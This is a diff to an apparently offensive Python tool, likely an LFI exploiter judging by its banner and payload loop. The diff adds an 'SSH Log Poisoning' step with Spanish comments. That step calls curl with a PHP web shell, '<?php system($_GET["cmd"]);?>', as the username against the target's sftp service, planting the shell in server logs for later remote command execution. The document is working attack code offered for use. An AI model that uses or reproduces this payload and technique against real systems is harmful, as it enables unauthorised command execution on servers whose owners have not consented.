@@ -5,7 +5,7 @@ import requests
 import signal
 import argparse
 import sys
-
+import subprocess
 BANNER = """
     __    ___              ____                            
    / /   /   |____  __  __/ __ \_      ______              
@@ -108,6 +108,20 @@ def main():
 
         except:
             print(f"[-] Error request: {url} payload: {payload}")
+    # SSH Log Poisoning mediante ssh y curl
+    # Define el comando curl con la autenticación y la URL
+    url = url.replace('http://','')
+    url = url.replace('https://','')
+    command = [
+        'curl',
+    	'-u', '<?php system($_GET["cmd"]);?>',  # Autenticación
+    	'sftp://'+url+'/anything',  # URL del recurso
+    	'-k'
+    ]
+    # Ejecuta el comando y captura la salida
+    result = subprocess.run(command, capture_output=True, text=True)
 
+    # Imprime la salida
+    print(result.stdout)
 if __name__ == "__main__":
     main()
